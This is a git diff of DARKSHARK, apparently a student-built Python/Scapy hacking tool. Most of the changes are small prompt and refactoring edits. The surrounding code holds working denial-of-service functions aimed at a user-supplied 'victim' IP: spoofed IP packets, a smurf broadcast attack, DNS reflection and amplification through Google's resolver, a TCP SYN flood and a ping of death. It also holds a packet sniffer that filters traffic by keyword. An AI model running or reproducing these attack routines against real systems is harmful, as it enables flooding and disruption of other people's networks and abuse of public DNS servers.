@@ -1,3 +1,4 @@
+#Group- Parth,Gaurav,Manas
 #!/usr/bin/env python3
 
 #imports
@@ -80,11 +81,18 @@ def validate_ip(ip):
 	except ValueError:
 		return False
 
-#Return a valid count for packets, either a positive input or default value
-def get_packetCount():
-	num = input("Please enter the number of packets to be sent. (default is 5)")
+#Return a valid count for packets to be sent, either a positive input or default value
+def get_packetCount_send():
+	num = input("Please enter the number of packets to be sent(default is 5): ")
 	while num and int(num)<0:
-		num = input("Please enter a valid count for packets! (Default is 5) ")
+		num = input("Please enter a valid count for packets! (Default is 5): ")
+	return int(num) if num else 5
+	
+#Return a valid count for packets to be captured, either a positive input or default value
+def get_packetCount_capture():
+	num = input("Please enter the number of packets to be captured(default is 5): ")
+	while num and int(num)<0:
+		num = input("Please enter a valid count for packets! (Default is 5): ")
 	return int(num) if num else 5
 
 #print introduction
@@ -102,7 +110,6 @@ def print_intro():
 	print(logo)
 	for i in range (130):
 		print("-", end = "")
-	# print("\n\t\t\t\t\t__/\__ Welcome to the DARKSHARK (v1.0) __/\__")
 	print("\n\nGet ready to dive in the world of hacking with your new buddy DARKSHARK.")
 	print("Developed with \N{blue heart} by the three comrades:")
 	print("\t-> Parth Thakker")
@@ -171,8 +178,8 @@ def capture_packets(filecounter):
 	#reset packet print counter
 	global counter
 	counter = 1
-	#Get the packetnumber
-	packetNumber = get_packetCount()
+	#Get the packetnumber to capture
+	packetNumber = get_packetCount_capture()
 		
 	#Get the interface
 	interface = ""
@@ -197,7 +204,7 @@ def capture_packets(filecounter):
 	#Get the regex to match in packet
 	keyword = input("Enter a keyword/regex to be searched in the raw data (leave blank if none): ")
     
-	print("\nPackets captured and the data: (timeout is 20 seconds)")
+	print("\nPackets captured and the data is: (timeout is 20 seconds)")
 	p = sniff(count = packetNumber, iface = actual_interface, filter = bpf, prn = print_packet, lfilter = lambda x: re.search(keyword,str(x)), timeout = 20)
 
 	#If packets are captured, print and store them
@@ -243,15 +250,15 @@ def ip_spoofing():
 	print("\t\t IP Spoofing \N{ghost}")
 	print("-"*60)
 	
-	source_ip = input("Please enter the source IP address:")
+	source_ip = input("Please enter the source IP address: ")
 	while not validate_ip(source_ip):
-		source_ip = input("Invalid IP! Please enter a valid IP address")
+		source_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	dest_ip = input("Please enter the destination IP address:")
+	dest_ip = input("Please enter the destination IP address: ")
 	while not validate_ip(dest_ip):
-		dest_ip = input("Invalid IP! Please enter a valid IP address")
+		dest_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	num_packets = get_packetCount()
+	num_packets = get_packetCount_send()
 
 	send( IP(src = source_ip, dst =dest_ip)/TCP()/"Spoofing You rn :)" , count = num_packets )
 	print("\nIP Spoofing attack finished.")
@@ -261,25 +268,25 @@ def ip_spoofing():
 def ip_smurf_attack():
 	print("\t\t IP SMURF Attack \N{cyclone}")
 	print("-"*60)
-	victim_ip = input("Please enter the victim's IP address:")
+	victim_ip = input("Please enter the victim's IP address: ")
 	while not validate_ip(victim_ip):
-		victim_ip = input("Invalid IP! Please enter a valid IP address")
+		victim_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	num_packets = get_packetCount()
+	num_packets = get_packetCount_send()
 
-	send( IP(src = victim_ip, dst ='255.255.255.255')/TCP()/"Smurfing You rn :P" , count = num_packets )
+	send( IP(src = victim_ip, dst ='255.255.255.255')/TCP()/"Smurfing You rn :)" , count = num_packets )
 	print("\nIP Smurfing attack finished.")
 	print("-"*60)
 
 #dns reflection attack
 def dns_reflection_attack():
-	print("\t\t DNS Reflection Attack")
+	print("\t\t DNS Reflection Attack \N{bomb}")
 	print("-"*60)
-	victim_ip = input("Please enter the victim's IP address:")
+	victim_ip = input("Please enter the victim's IP address: ")
 	while not validate_ip(victim_ip):
-		victim_ip = input("Invalid IP! Please enter a valid IP address")
+		victim_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	num_packets = get_packetCount()
+	num_packets = get_packetCount_send()
 	dns_ref = IP(src = victim_ip, dst = "8.8.8.8")/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "A")) #Using google ns for now
 
 	send(dns_ref, count = num_packets)
@@ -290,11 +297,11 @@ def dns_reflection_attack():
 def dns_amplification_attack():
 	print("\t\t DNS Amplification Attack \N{bomb}")
 	print("-"*60)
-	victim_ip = input("Please enter the victim's IP address:")
+	victim_ip = input("Please enter the victim's IP address: ")
 	while not validate_ip(victim_ip):
-		victim_ip = input("Invalid IP! Please enter a valid IP address")
+		victim_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	num_packets = get_packetCount()
+	num_packets = get_packetCount_send()
 	dns_amp = IP(src = victim_ip, dst = "8.8.8.8")/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ANY")) #Using google ns for now
 
 	send(dns_amp, count = num_packets)
@@ -306,11 +313,11 @@ def tcp_synflood_attack():
 	print("\t\t TCP SYN Flooding Attack \N{water wave}")
 	print("-"*60)
 	#remaining code
-	victim_ip = input("Please enter the victim's IP address:")
+	victim_ip = input("Please enter the victim's IP address: ")
 	while not validate_ip(victim_ip):
-		victim_ip = input("Invalid IP! Please enter a valid IP address")
+		victim_ip = input("Invalid IP! Please enter a valid IP address..")
 
-	num_packets = get_packetCount()
+	num_packets = get_packetCount_send()
 
 	syn_flood = IP(dst = victim_ip)/TCP(sport=RandShort(), dport= [80], seq=12345,ack=1000,window=1000,flags="S")/"Flooding you rn xD"
 
@@ -323,9 +330,9 @@ def tcp_synflood_attack():
 def ping_of_death():
 	print("\t\t Ping of Death \N{skull}")
 	print("-"*60)
-	victim_ip = input("Please enter the victim's IP address:")
+	victim_ip = input("Please enter the victim's IP address: ")
 	while not validate_ip(victim_ip):
-		victim_ip = input("Invalid IP! Please enter a valid IP address")
+		victim_ip = input("Invalid IP! Please enter a valid IP address..")
 
 	send( fragment(IP(dst=victim_ip)/ICMP()/("Very big payload"*60000)) )
 	print("\nPing of death carried out successfully.")
@@ -333,7 +340,7 @@ def ping_of_death():
 
 #option 4 of menu: launch attacks
 def launch_attacks():
-	print("It's time to launch attacks \N{fire} Kick off by choosing one of the following:- ") #replace fire symbol with unicode
+	print("It's time to launch attacks \N{fire} Kick off by choosing one of the following:- ")
 	print("1. IP Smurf Attack")
 	print("2. IP Spoofing")
 	print("3. DNS Amplification Attack")
